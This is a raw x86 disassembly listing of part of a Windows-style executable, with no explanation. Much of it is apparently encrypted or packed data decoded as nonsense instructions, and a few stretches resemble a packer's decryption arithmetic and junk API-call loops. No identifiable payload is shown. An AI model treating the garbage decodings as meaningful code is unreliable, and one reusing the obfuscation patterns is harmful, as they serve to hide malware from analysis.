  40518d:	xchg   DWORD PTR [ecx+0x5f52f56b],ecx
  405193:	(bad)  
  405194:	mov    ah,0x67
  405196:	loop   0x4051ee
  405198:	push   0x6a
  40519a:	sbb    eax,0x10b590be
  40519f:	les    esp,FWORD PTR [ecx]
  4051a1:	mov    ebx,0x52fc99da
  4051a6:	call   0x4ac09f38
  4051ab:	jmp    0x19410457
  4051b0:	add    DWORD PTR [edi+0x6c],edx
  4051b3:	fist   DWORD PTR [ecx]
  4051b5:	(bad)  
  4051b7:	stos   DWORD PTR es:[edi],eax
  4051b8:	cld    
  4051b9:	jno    0x4051ce
  4051bb:	ret    
  4051bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4051bd:	adc    al,0x68
  4051bf:	ror    BYTE PTR [ebx-0x3e],cl
  4051c2:	scas   eax,DWORD PTR es:[edi]
  4051c3:	stos   BYTE PTR es:[edi],al
  4051c4:	adc    DWORD PTR [ebx],ecx
  4051c6:	cmp    bl,ch
  4051c8:	mov    dl,0x1c
  4051ca:	test   al,0xb0
  4051cc:	lds    ebp,FWORD PTR [edi+0x4a7c6adf]
  4051d2:	(bad)  [eax]
  4051d4:	pop    eax
  4051d5:	mov    DWORD PTR [esi-0xc8b89a6],ebp
  4051db:	(bad)  [edx+0x58]
  4051de:	je     0x405256
  4051e0:	adc    BYTE PTR [eax+0x1d4ee2f],bh
  4051e6:	lea    ebp,[eax+edi*2+0x24]
  4051ea:	out    dx,eax
  4051eb:	rol    BYTE PTR [ebp+ecx*4+0x6c2061b1],cl
  4051f2:	aam    0x2c
  4051f4:	dec    ecx
  4051f5:	fs pop ecx
  4051f7:	arpl   WORD PTR [edx],sp
  4051f9:	push   edx
  4051fa:	push   esi
  4051fb:	push   eax
  4051fc:	push   eax
  4051fd:	mov    ebx,0x232fb9ac
  405202:	mov    ecx,0xe8e951f0
  405207:	pop    esi
  405208:	push   ebx
  405209:	sbb    cl,BYTE PTR [ebx+0x27]
  40520c:	jp     0x40523b
  40520e:	push   es
  40520f:	lahf   
  405210:	mov    eax,0x70b1619b
  405215:	jmp    0xac546803
  40521a:	repnz adc esi,DWORD PTR [edi+0x50cde735]
  405221:	jg     0x405287
  405223:	xor    al,0x4a
  405225:	fstp   DWORD PTR [esi+0x61fa81e8]
  40522b:	add    eax,DWORD PTR [ebx]
  40522d:	xchg   BYTE PTR [ebx],bl
  40522f:	push   esi
  405230:	inc    ecx
  405231:	js     0x405228
  405233:	data16 mov WORD PTR [ebp-0x74fcec91],ds
  40523a:	pop    ds
  40523b:	xchg   DWORD PTR [ebx],edx
  40523d:	push   0xfcf6fde8
  405242:	dec    edi
  405243:	es push ds
  405245:	aas    
  405246:	add    DWORD PTR [esi+0x428b5c6d],edx
  40524c:	jne    0x405230
  40524e:	mov    ds:0x1563002a,eax
  405253:	rol    BYTE PTR [eax-0x16cbc78a],0x94
  40525a:	sbb    DWORD PTR [ebp-0x47cf9c53],edx
  405260:	or     BYTE PTR gs:[edx-0x5f],ah
  405264:	dec    esi
  405265:	fidivr DWORD PTR [ebx-0x675ff175]
  40526b:	pop    ebx
  40526c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40526d:	adc    cl,al
  40526f:	int3   
  405270:	xchg   ebp,eax
  405271:	cmp    DWORD PTR [ebp+0x34],edx
  405274:	xchg   ebp,eax
  405275:	add    bh,BYTE PTR [esi-0x6b5f52f6]
  40527b:	fs dec edi
  40527d:	ret    
  40527e:	mov    esp,0x66903a76
  405283:	les    ecx,FWORD PTR [edx]
  405285:	and    DWORD PTR [edx],0x36ddd071
  40528b:	pop    ds
  40528c:	retf   
  40528d:	inc    esp
  40528e:	xlat   BYTE PTR ds:[ebx]
  40528f:	sub    eax,0x65ebed97
  405294:	pop    ss
  405295:	int    0x8b
  405297:	jae    0x405253
  405299:	cmp    eax,0x4e2978c9
  40529e:	imul   ebp,DWORD PTR [ecx],0x49308c4a
  4052a4:	addr16 sub eax,0x8bd7af0f
  4052aa:	jge    0x405294
  4052ac:	xor    edi,eax
  4052ae:	add    edx,edi
  4052b0:	mov    edi,DWORD PTR [ebp-0x8]
  4052b3:	lea    edx,[edx+edi*1+0x32729d]
  4052ba:	mov    DWORD PTR [ebp-0x8],edx
  4052bd:	mov    edx,DWORD PTR [ebp-0x20]
  4052c0:	xor    edx,eax
  4052c2:	mov    edi,0xffcd8d63
  4052c7:	sub    edi,edx
  4052c9:	add    edi,DWORD PTR [ebp-0x10]
  4052cc:	mov    edx,DWORD PTR [ebp-0x20]
  4052cf:	mov    ebx,DWORD PTR [ebp-0x8]
  4052d2:	xor    edx,eax
  4052d4:	add    edx,ecx
  4052d6:	imul   edx,ebx
  4052d9:	cmp    edx,edi
  4052db:	jbe    0x403ae8
  4052e1:	pop    ebx
  4052e2:	pop    edi
  4052e3:	leave  
  4052e4:	ret    0x8
  4052e7:	push   ebp
  4052e8:	mov    ebp,esp
  4052ea:	push   ecx
  4052eb:	and    DWORD PTR ds:0x4305a6,0x0
  4052f5:	jmp    0x405305
  4052fa:	mov    eax,ds:0x4305a6
  4052ff:	inc    eax
  405300:	mov    ds:0x4305a6,eax
  405305:	cmp    DWORD PTR ds:0x4305a6,0x18
  40530c:	jae    0x40536e
  405312:	cmp    DWORD PTR ds:0x4305a6,0x4
  405319:	jne    0x40533f
  40531f:	push   0x7989
  405324:	push   0x6fea
  405329:	push   DWORD PTR [ebp-0x28]
  40532c:	push   0x5a2e
  405331:	push   DWORD PTR [ebp-0x24]
  405334:	push   0x2930
  405339:	call   DWORD PTR ds:0x42eba8
  40533f:	cmp    DWORD PTR ds:0x4305a6,0x3
  405346:	jne    0x405357
  40534c:	mov    eax,ds:0x4305a6
  405351:	inc    eax
  405352:	mov    ds:0x4305a6,eax
  405357:	jmp    0x4052fa
  40535c:	mov    eax,ds:0x4305da
  405361:	xor    edx,edx
  405363:	add    edx,DWORD PTR ds:0x43066a
  405369:	sub    eax,edx
  40536b:	or     eax,DWORD PTR [eax+edx*1]
  40536e:	push   ecx
  40536f:	or     eax,DWORD PTR ds:0x4305c2
  405375:	mov    eax,0xf89c8535
  40537a:	sbb    DWORD PTR ds:0x4305b2,ecx
  405380:	mov    DWORD PTR [ebp-0x8],eax
  405383:	movzx  ecx,BYTE PTR ds:0x4305a6
  40538a:	add    DWORD PTR ds:0x42e872,ecx
  405390:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  405397:	and    DWORD PTR ds:0x4305be,0x0
  4053a1:	mov    ecx,DWORD PTR ds:0x4305be
  4053a7:	inc    ecx
  4053a8:	mov    DWORD PTR ds:0x4305be,ecx
  4053ae:	cmp    DWORD PTR ds:0x4305be,0x22
  4053b5:	jne    0x4053c9
  4053bb:	push   DWORD PTR [ebp-0x24]
  4053be:	push   0x8601
  4053c3:	call   DWORD PTR ds:0x42eca0
  4053c9:	cmp    DWORD PTR ds:0x4305be,0x12
  4053d0:	jb     0x4053a1
  4053d6:	and    DWORD PTR ds:0x42ef14,0x0
  4053e0:	mov    ecx,DWORD PTR ds:0x42ef14
  4053e6:	inc    ecx
  4053e7:	mov    DWORD PTR ds:0x42ef14,ecx
  4053ed:	cmp    DWORD PTR ds:0x42ef14,0x7
  4053f4:	jne    0x405405
  4053fa:	push   0x68cd
  4053ff:	call   DWORD PTR ds:0x42eae4
  405405:	cmp    DWORD PTR ds:0x42ef14,0x6
  40540c:	jne    0x40541f
  405412:	mov    ecx,DWORD PTR ds:0x42ef14
  405418:	inc    ecx
  405419:	mov    DWORD PTR ds:0x42ef14,ecx
  40541f:	cmp    DWORD PTR ds:0x42ef14,0x1d
  405426:	jb     0x4053e0
  40542c:	mov    edx,DWORD PTR [ebp-0x8]
  40542f:	push   esi
  405430:	mov    ecx,0x7510856
  405435:	xor    edx,ecx
  405437:	mov    esi,0x32729d
  40543c:	push   edi
  40543d:	mov    edi,DWORD PTR [ebp+0x10]
  405440:	add    edx,esi
  405442:	jmp    0x40581e
  405447:	sub    dl,BYTE PTR [edi+0x7c7d3afd]
  40544d:	in     eax,dx
  40544e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544f:	ins    DWORD PTR es:[edi],dx
  405450:	ret    
  405451:	mov    ecx,0x5b3bc509
  405456:	sub    edx,edx
  405458:	and    al,0x7e
  40545a:	jle    0x405419
  40545c:	jno    0x4054dc
  40545e:	jle    0x4053fa
  405460:	arpl   WORD PTR [ebx],sp
  405462:	sub    ebx,ebp
  405464:	mov    BYTE PTR [esi+ebp*8-0x7ce1a6ef],al
  40546b:	mov    ds:0xa4c6e969,al
  405470:	lock ins BYTE PTR es:[edi],dx
  405472:	loopne 0x4054ab
  405474:	and    eax,0x4b635aa3
  405479:	stos   DWORD PTR es:[edi],eax
  40547a:	and    BYTE PTR [edx-0x4b214e6b],cl
  405480:	(bad)  
  405481:	in     al,dx
  405482:	(bad)  
  405483:	and    bl,dh
  405485:	fisttp QWORD PTR [edx-0x5b01e582]
  40548b:	fwait
  40548c:	ret    0x7ba8
  40548f:	jo     0x4054a4
  405491:	mov    ecx,0x1caa634
  405496:	cmp    al,0x40
  405498:	test   eax,0xb11834d4
  40549d:	inc    esi
  40549e:	icebp  
  40549f:	mov    bh,0xeb
  4054a1:	out    dx,eax
  4054a2:	and    esp,DWORD PTR [esi]
  4054a4:	iret   
  4054a5:	pop    eax
  4054a6:	stos   DWORD PTR es:[edi],eax
  4054a7:	test   DWORD PTR [ebx+0x3a],ecx
  4054aa:	imul   eax,esp,0x9e818a27
  4054b0:	outs   dx,BYTE PTR ds:[esi]
  4054b1:	cmp    dl,BYTE PTR [esi+0x6d]
  4054b4:	aad    0xf9
  4054b6:	adc    esp,edi
  4054b8:	jmp    0x8c7d:0xeb177dee
  4054bf:	ins    DWORD PTR es:[edi],dx
  4054c0:	jbe    0x405485
  4054c2:	push   0xffffffa6
  4054c4:	xchg   esi,eax
  4054c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054c6:	cmp    cl,BYTE PTR [esi+0x48daeefd]
  4054cc:	adc    DWORD PTR [eax-0x6e0fc367],edi
  4054d2:	adc    eax,0xa29f0779
  4054d7:	push   edx
  4054d8:	pop    ecx
  4054d9:	mov    al,ds:0xa48f0ff
  4054de:	xchg   edi,eax
  4054df:	jns    0x40555e
  4054e1:	sbb    ch,0x0
  4054e4:	jne    0x405500
  4054e6:	xchg   esp,edx
  4054e8:	fwait
  4054e9:	cmp    BYTE PTR [edx],0x1a
  4054ec:	sub    al,0xee
  4054ee:	shl    al,0x29
  4054f1:	repnz mov bl,0x93
  4054f4:	xor    BYTE PTR [edx+0x74],bh
  4054f7:	test   BYTE PTR [ebp-0x59],bh
  4054fa:	or     al,0xb4
  4054fc:	cmp    ebx,DWORD PTR ds:0x58c2b68b
  405502:	jle    0x40552d
  405504:	xchg   esp,eax
  405505:	addr16 dec edi
  405507:	inc    esp
  405508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405509:	push   edi
  40550a:	fcomp  QWORD PTR [ebx]
  40550c:	fild   DWORD PTR [esi-0x1]
  40550f:	push   cs
  405510:	mov    DWORD PTR [edi+0x6d],0x3e0defef
  405517:	mov    eax,0xac4fc8c4
  40551c:	test   BYTE PTR [esi],ah
  40551e:	neg    ebx
  405520:	scas   al,BYTE PTR es:[edi]
  405521:	(bad)  
  405522:	in     al,dx
  405523:	mov    dh,0x76
  405525:	mov    bh,0xd3
  405527:	js     0x4054e8
  405529:	sub    al,0xa8
  40552b:	stos   DWORD PTR es:[edi],eax
  40552c:	jl     0x405586
  40552e:	push   cs
  40552f:	jg     0x4054b8
  405531:	leave  
  405532:	ret    
  405533:	jge    0x405523
  405535:	js     0x4054bb
  405537:	cmp    BYTE PTR [ebp-0x5b5bd889],bl
  40553d:	inc    ecx
  40553e:	mov    cl,0xfb
  405540:	pop    edi
  405541:	les    ebx,FWORD PTR ds:0xd5555e85
  405547:	inc    esi
  405548:	out    dx,al
  405549:	adc    al,0x87
  40554b:	adc    eax,0x1650e28f
  405550:	mov    BYTE PTR [eax*1+0xb2e2fd5],dl
  405557:	cdq    
  405558:	aaa    
  405559:	lea    esp,[eax]
  40555b:	and    bl,BYTE PTR [eax+0x6af2acbe]
  405561:	mov    edx,0xe2204019
  405566:	xchg   edx,eax
  405567:	sub    al,BYTE PTR [edx+ecx*2-0xbb68743]
  40556e:	outs   dx,BYTE PTR ds:[esi]
  40556f:	push   ds
  405570:	leave  
  405571:	inc    esi
  405572:	inc    edx
  405573:	clc    
  405574:	sbb    al,0xf7
  405576:	ret    
  405577:	mov    bh,0xe4
  405579:	fist   WORD PTR [ebx]
  40557b:	or     DWORD PTR [ebp-0x1b],esi
  40557e:	sbb    al,0xca
  405580:	inc    esp
  405581:	xor    al,0x81
  405583:	add    edi,DWORD PTR [edx+0x7]
  405586:	cmp    eax,0xfb62b4e4
  40558b:	xchg   ebx,eax
  40558c:	dec    ebx
  40558d:	out    dx,eax
  40558e:	fcomp  QWORD PTR [eax-0x71]
  405591:	out    0x1d,al
  405593:	into   
  405594:	mov    bl,0x34
  405596:	lahf   
  405597:	adc    eax,0xf049b1d0
  40559c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40559d:	jns    0x4055e6
  40559f:	xchg   edi,eax
  4055a0:	pop    es
  4055a1:	fcomip st,st(7)
  4055a3:	push   ds
  4055a4:	mov    ebp,0xfd222340
  4055a9:	fadd   DWORD PTR [esi-0x31]
  4055ac:	xchg   ebx,eax
  4055ad:	fist   DWORD PTR [ebx]
  4055af:	fs pop ebx
  4055b1:	mov    ds:0xd845f109,al
  4055b6:	out    0xa5,al
  4055b8:	push   ebx
  4055b9:	xor    eax,0xeb0f82f
  4055be:	dec    eax
  4055bf:	out    dx,al
  4055c0:	loop   0x40556f
  4055c2:	mov    ecx,0xb2f41b79
  4055c7:	adc    edx,DWORD PTR [ebx+0x5d]
  4055ca:	xchg   ebx,eax
  4055cb:	lahf   
  4055cc:	cmp    bl,cl
  4055ce:	jmp    0x7848df3c
  4055d3:	adc    DWORD PTR [esi],eax
  4055d5:	(bad)  
  4055d6:	sub    eax,0x80d762e1
  4055db:	pop    ebx
  4055dc:	mov    esp,0x8b375157
  4055e1:	or     ebp,DWORD PTR [esp+eax*4-0x5f956615]
  4055e8:	ds ins DWORD PTR es:[edi],dx
  4055ea:	jg     0x4055ef
  4055ec:	fist   DWORD PTR [ebp-0x53b0d5f9]
  4055f2:	pusha  
  4055f3:	push   0xe52193dd
  4055f8:	popa   
  4055f9:	sub    ebp,DWORD PTR [edx+0x5c4744c0]
  4055ff:	push   ds
  405600:	call   0x2343:0xfac48c0
  405607:	sbb    eax,0x7047ec27
  40560c:	push   ecx
  40560d:	ins    DWORD PTR es:[edi],dx
  40560e:	add    cl,BYTE PTR [ebp+0x60]
  405611:	out    dx,eax
  405612:	and    ah,BYTE PTR [edx]
  405614:	jns    0x4055d5
  405616:	pop    ebx
  405617:	cs scas al,BYTE PTR es:[edi]
  405619:	stc    
  40561a:	jbe    0x40566f
  40561c:	and    ah,bl
  40561e:	cld    
  40561f:	jbe    0x4055a6
  405621:	mov    dh,0x63
  405623:	and    eax,0x1e5eca82
  405628:	addr16 std 
  40562a:	mov    al,BYTE PTR [ebp+0x38]
  40562d:	ins    DWORD PTR es:[edi],dx
  40562e:	push   ss
  40562f:	mov    gs,edx
  405631:	and    al,0x3d
  405633:	push   ds
  405634:	and    eax,DWORD PTR [esi]
  405636:	jo     0x405635
  405638:	repnz and DWORD PTR [edx+ecx*1+0x467d5c18],ebx
  405640:	enterw 0x61ad,0x50
  405645:	dec    eax
  405646:	enter  0x4539,0xe8
  40564a:	cmp    eax,0xe09d2d7e
  40564f:	aam    0x29
  405651:	in     eax,dx
  405652:	js     0x4055ed
  405654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405655:	sub    edx,ecx
  405657:	cli    
  405658:	push   esi
  405659:	sub    eax,0x327153b6
  40565e:	push   esi
  40565f:	pop    ebp
  405660:	xchg   BYTE PTR [esi],dh
  405662:	clc    
  405663:	xchg   esp,eax
  405664:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405665:	sbb    al,0x39
  405667:	xor    DWORD PTR [ebx+0x7471478f],edx
  40566d:	push   edx
  40566e:	sbb    cl,al
  405670:	add    eax,0x166d0e43
  405675:	cld    
  405676:	popa   
  405677:	jb     0x405681
  405679:	call   0xc9c3:0x5c86aca0
  405680:	push   0xffffffb5
  405682:	div    BYTE PTR [edi]
  405684:	pop    esi
  405685:	sbb    BYTE PTR [edi+0x7c8cc39e],ch
  40568b:	or     ebx,DWORD PTR [ebx]
  40568d:	out    dx,al
  40568e:	imul   edx,DWORD PTR [edx+0x3c],0xa83336b1
  405695:	mov    esi,0x9e408146
  40569a:	xchg   ecx,eax
  40569b:	popa   
  40569c:	xchg   edx,eax
  40569d:	(bad)  
  40569e:	retf   
  40569f:	inc    ebx
  4056a0:	mov    esp,edx
  4056a2:	sar    DWORD PTR ds:0x5e0ab4c6,cl
  4056a8:	das    
  4056a9:	rcl    BYTE PTR [ebx+0x64],1
  4056ac:	loope  0x40567d
  4056ae:	xchg   edx,eax
  4056af:	not    DWORD PTR [eax]
  4056b1:	(bad)  
  4056b3:	out    0x75,al
  4056b5:	cmp    ecx,ebx
  4056b7:	push   0xffffffe9
  4056b9:	pop    ss
  4056ba:	push   ebp
  4056bb:	mov    esp,0xb7fb2d7d
  4056c0:	(bad)  
  4056c1:	aad    0xf1
  4056c3:	xchg   ebp,eax
  4056c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056c5:	pop    ebx
  4056c6:	(bad)  
  4056c7:	jmp    0xc20a:0xd787586e
  4056ce:	xchg   DWORD PTR [ebx],eax
  4056d0:	xor    ebp,DWORD PTR [edx]
  4056d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d3:	out    0x8d,eax
  4056d5:	adc    bh,0x66
  4056d8:	push   edx
  4056d9:	mov    bl,0xc8
  4056db:	lock jb 0x40571c
  4056de:	adc    BYTE PTR ds:0x8b36f6e6,ah
  4056e4:	mov    edi,0xe8c8b732
  4056e9:	retf   0x2fd2
  4056ec:	les    esp,FWORD PTR [ebx]
  4056ee:	sbb    edx,DWORD PTR [ebp+edi*4+0x1f]
  4056f2:	jb     0x4056bb
  4056f4:	aam    0xd1
  4056f6:	pop    ebx
  4056f7:	pop    ebx
  4056f8:	(bad)  
  4056f9:	sti    
  4056fa:	or     BYTE PTR [edi+eiz*8+0x4db9720f],al
  405701:	jmp    0xfa8c839b
  405706:	pop    esi
  405707:	push   esi
  405708:	int    0xd9
  40570a:	dec    eax
  40570b:	vmwrite edx,esi
  40570e:	cmp    esp,DWORD PTR [edx+ebx*2+0x5e]
  405712:	mov    WORD PTR [ebp+0x54c6c85a],fs
  405718:	popa   
  405719:	verr   WORD PTR [esi+eax*2+0x32]
  40571e:	mov    ebx,0x350db458
  405723:	push   esp
  405724:	push   ebp
  405725:	aam    0xcd
  405727:	sbb    DWORD PTR [edx-0x467fc0e3],ebx
  40572d:	test   al,0xa6
  40572f:	push   ss
  405730:	(bad)
  405734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405735:	pop    ss
  405736:	add    DWORD PTR ds:0xe82076c3,eax
  40573c:	hlt    
  40573d:	out    dx,eax
  40573e:	adc    al,0xd3
  405740:	(bad)  
  405741:	in     al,dx
  405742:	(bad)  
  405743:	pop    eax
  405744:	add    al,0xae
  405746:	add    eax,0x7ab07231
  40574b:	jno    0x4056ec
  40574d:	or     al,0xcc
  40574f:	mov    di,0x20a4
  405753:	pushf  
  405754:	jp     0x405728
  405756:	jecxz  0x4056e1
  405758:	xchg   DWORD PTR [ecx+0x19897d20],eax
  40575e:	inc    esi
  40575f:	data16 icebp 
  405761:	add    eax,DWORD PTR [esi+0x60203968]
  405767:	pop    ss
  405768:	adc    BYTE PTR [eax],0xc9
  40576b:	pop    edx
  40576c:	cwde   
  40576d:	xchg   ebp,eax
  40576e:	(bad)  
  40576f:	sahf   
  405770:	inc    esi
  405771:	push   ecx
  405772:	fucomi st,st(4)
  405774:	pop    ebp
  405775:	aad    0xaa
  405777:	(bad)  
  405778:	and    eax,0x1a777a
  40577d:	mov    cl,0xb2
  40577f:	ja     0x40572d
  405781:	jle    0x405756
  405783:	(bad)  
  405785:	xor    edx,esi
  405787:	ins    BYTE PTR es:[edi],dx
  405788:	mov    dl,0x12
  40578a:	push   0x2cac345b
  40578f:	out    dx,al
  405790:	xchg   ebx,eax
  405791:	sbb    DWORD PTR [ecx],0x18eafd6a
  405797:	cli    
  405798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405799:	mov    dl,0x19
  40579b:	mov    ds:0xdd65233b,al
  4057a0:	cmp    al,0x56
  4057a2:	mov    ds:0x2e6df761,al
  4057a7:	adc    al,0xd3
  4057a9:	pop    esp
  4057aa:	mov    cl,BYTE PTR [edx+0x1ebfb2c1]
  4057b0:	call   0xb41d:0x6d98f24a
  4057b7:	add    dl,cl
  4057b9:	ret    
  4057ba:	sbb    eax,0xfc5f8407
  4057bf:	and    ecx,DWORD PTR [esi-0x7bed1353]
  4057c5:	push   edx
  4057c6:	shl    BYTE PTR [edx+0x154fded2],cl
  4057cc:	dec    edx
  4057cd:	dec    edi
  4057ce:	add    edi,DWORD PTR [edx]
  4057d0:	and    eax,0xe98373d8
  4057d5:	inc    esi
  4057d6:	leave  
  4057d7:	push   eax
  4057d8:	sbb    dl,BYTE PTR [esp+ebp*1]
  4057db:	xchg   edi,eax
  4057dc:	pop    esp
  4057dd:	imul   ebp,edx,0xd9182ddb
  4057e3:	je     0x4057bf
  4057e5:	into   
  4057e6:	push   eax
  4057e7:	or     ebp,DWORD PTR [edx-0xa]
  4057ea:	sbb    BYTE PTR ds:0x9831c804,bh
  4057f0:	cdq    
  4057f1:	scas   al,BYTE PTR es:[edi]
  4057f2:	jmp    0x23eb:0xb20fb956
  4057f9:	scas   al,BYTE PTR es:[edi]
  4057fa:	sub    eax,0x1c21509b
  4057ff:	sub    BYTE PTR [ebx],0xe1
  405802:	test   bx,0x467d
  405807:	dec    ecx
  405808:	ret    
  405809:	ins    DWORD PTR es:[edi],dx
  40580a:	push   0x8c1ed1eb
  40580f:	adc    si,sp
  405812:	(bad)  
  405813:	adc    ah,cl
  405815:	pusha  
  405816:	repnz or edx,DWORD PTR [edx+0x2f4b4ae8]
  40581d:	push   cs
  40581e:	cmp    edi,edx
  405820:	je     0x40642d
  405826:	mov    edx,DWORD PTR [ebp-0x8]
  405829:	mov    eax,DWORD PTR [ebp-0x4]
  40582c:	xor    eax,ecx
  40582e:	mov    edi,0xffcd8d63
  405833:	jmp    0x405c0f
  405838:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405839:	loop   0x4058ae
  40583b:	fmul   DWORD PTR [ebx-0x7]
  40583e:	jge    0x4058a4
  405840:	xor    BYTE PTR [edx+ebx*8-0x4e57acc4],bh
  405847:	std    
  405848:	adc    DWORD PTR [eax],edi
  40584a:	jle    0x4058ca
  40584c:	mov    ebp,0x787e7e71
  405851:	data16 mov cl,0xfa
  405854:	gs sbb al,0x4f
  405857:	inc    esp
  405858:	data16 mov BYTE PTR [edi+0x57],dl
  40585c:	add    bh,BYTE PTR [ecx]
  40585e:	pusha  
  40585f:	and    ebx,edx
  405861:	das    
  405862:	repz add ah,BYTE PTR [eax]
  405865:	mov    es,WORD PTR [eax+0x28]
  405868:	push   edi
  405869:	in     eax,0x14
  40586b:	xchg   edx,eax
  40586c:	dec    esi
  40586d:	ret    0x4d85
  405870:	ss stos BYTE PTR es:[edi],al
  405872:	dec    ecx
  405873:	aam    0x79
  405875:	je     0x405821
  405877:	sub    al,0x72
  405879:	fidiv  WORD PTR [edx-0x73]
  40587c:	jb     0x40584d
  40587e:	xchg   ebp,eax
  40587f:	vpmacssww ymm12,ymm3,ymm7,YMMWORD PTR [esi]
  405885:	aam    0xf9
  405887:	das    
  405888:	sbb    ah,al
  40588a:	push   0x5aabf2c1
  40588f:	cmp    dh,BYTE PTR [ebp+0x482c795a]
  405895:	test   eax,0xbbeb2cba
  40589a:	dec    esp
  40589b:	inc    esp
  40589c:	pop    edi
  40589d:	(bad)  [ecx]
  40589f:	mov    DWORD PTR [ecx-0x5],edx
  4058a2:	and    eax,0x58b812eb
  4058a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a8:	adc    BYTE PTR [ebx+ecx*4],bh
  4058ab:	and    eax,0x1227d0c1
  4058b0:	ficomp WORD PTR [eax]
  4058b2:	pop    ecx
  4058b3:	pop    edx
  4058b4:	cld    
  4058b5:	mov    edi,0x37eddeea
  4058ba:	outs   dx,BYTE PTR ds:[esi]
  4058bb:	cmp    BYTE PTR [edx],dh
  4058bd:	(bad)  [esi]
  4058bf:	push   ecx
  4058c0:	fist   DWORD PTR [edi+0x6f]
  4058c3:	jo     0x405928
  4058c5:	ins    BYTE PTR es:[edi],dx
  4058c6:	and    ch,BYTE PTR [edi+0x39]
  4058c9:	fstp   TBYTE PTR [ebx-0x687841f4]
  4058cf:	mov    ecx,0xd4a2ccab
  4058d4:	pop    ebp
  4058d5:	sub    DWORD PTR [ecx-0x26],esi
  4058d8:	lods   ax,WORD PTR ds:[esi]
  4058da:	ret    
  4058db:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4058dd:	sqrtps xmm5,XMMWORD PTR [eax+0x4f64f705]
  4058e4:	mov    bl,0x98
  4058e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058e7:	out    dx,al
  4058e8:	into   
  4058e9:	fisttp QWORD PTR [eax+ebx*1]
  4058ec:	mov    ebp,ebp
  4058ee:	(bad)  
  4058ef:	sub    dl,BYTE PTR [ebx+0x38]
  4058f2:	xchg   esi,eax
  4058f3:	cbw    
  4058f5:	and    esp,DWORD PTR [esi-0x1a]
  4058f8:	arpl   WORD PTR [edi+0x14],cx
  4058fb:	inc    esp
  4058fc:	or     eax,0xded741d3
  405901:	cmp    edx,esp
  405903:	inc    esp
  405904:	push   gs
  405906:	ret    0x7ca
  405909:	mov    es,WORD PTR [esi+0x524d92e1]
  40590f:	push   0xdcdbe110
  405914:	mov    dh,0xd5
  405916:	mov    esp,0x83506f08
  40591b:	addr16 test edx,ecx
  40591e:	shl    DWORD PTR [ebx-0x19],1
  405921:	and    cl,BYTE PTR [eax+0x7c]
  405924:	cmc    
  405925:	mov    dh,0x8a
  405927:	xor    eax,0x1de1bb26
  40592c:	out    dx,al
  40592d:	fistp  QWORD PTR [edx+eiz*1]
  405930:	stos   BYTE PTR es:[edi],al
  405931:	pop    es
  405932:	xor    al,0x26
  405934:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405935:	cmp    al,0x23
  405937:	cmp    bl,cl
  405939:	les    edi,FWORD PTR [ebp+0x7f2867c1]
  40593f:	mov    ds:0xb4f8e178,eax
  405944:	mov    ebp,es
  405946:	cdq    
  405947:	aad    0x55
  405949:	add    ebp,edx
  40594b:	pop    ebx
  40594c:	jo     0x40596d
  40594e:	mov    edi,0x8f5f45bc
  405953:	add    ebp,DWORD PTR [edi-0x3edf5910]
  405959:	xchg   DWORD PTR [ecx-0x68ca4dc],eax
  40595f:	push   ds
  405960:	fnstcw WORD PTR [eiz*2+0x4afcc457]
  405967:	(bad)  
  405968:	in     al,0x63
  40596a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40596b:	pop    DWORD PTR [edi]
  40596d:	inc    ecx
  40596e:	push   ss
  40596f:	mov    eax,ds:0x4c5e714f
  405974:	inc    eax
  405975:	shl    DWORD PTR [esi-0x8],1
  405978:	addr16 xor al,0x21
  40597b:	dec    ebx
  40597c:	lea    eax,[esi+0x2a]
  40597f:	ret    0x1dd5
  405982:	fidiv  DWORD PTR [esi+0x30]
  405985:	xchg   esp,eax
  405986:	or     BYTE PTR [ebx-0x7c],0x59
  40598a:	leave  
  40598b:	idiv   DWORD PTR [edx+0x3fb24486]
  405991:	xchg   ch,bl
  405993:	dec    edx
  405994:	inc    ebp
  405995:	push   edx
  405996:	rcr    DWORD PTR [edx-0x9],1
  405999:	test   BYTE PTR [ecx],0x78
  40599c:	mov    WORD PTR [ebx-0x5503b4d0],cs
  4059a2:	add    esi,DWORD PTR [edi-0x29a6f93f]
  4059a8:	push   edx
  4059a9:	sub    eax,eax
  4059ab:	in     al,0x2a
  4059ad:	nop
  4059ae:	ja     0x40599e
  4059b0:	leave  
  4059b1:	lds    esi,FWORD PTR [esi+esi*2]
  4059b4:	mov    WORD PTR [ebx-0x2],es
  4059b7:	sbb    DWORD PTR [ebx-0x4f],esp
  4059ba:	cmp    ebp,ecx
  4059bc:	mov    al,ds:0x8ed9504e
  4059c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059c2:	imul   ecx,esp,0xffffff99
  4059c5:	int3   
  4059c6:	inc    edx
  4059c7:	lahf   
  4059c8:	add    BYTE PTR [esi],ch
  4059ca:	icebp  
  4059cb:	rcr    al,0x3e
  4059ce:	jecxz  0x405a2a
  4059d0:	sbb    ebx,DWORD PTR [edi+edx*8]
  4059d3:	xchg   esp,eax
  4059d4:	lods   al,BYTE PTR ds:[esi]
  4059d5:	cmp    DWORD PTR [ebp+0x73],ebx
  4059d8:	mov    bh,0x74
  4059da:	gs pop ebp
  4059dc:	shl    DWORD PTR [ebx-0x5],1
  4059df:	jae    0x40596e
  4059e1:	jne    0x405a37
  4059e3:	sub    ch,cl
  4059e5:	or     eax,0x228333d3
  4059ea:	call   0x84ce:0x9a3a96bf
  4059f1:	loopne 0x405a16
  4059f3:	pop    eax
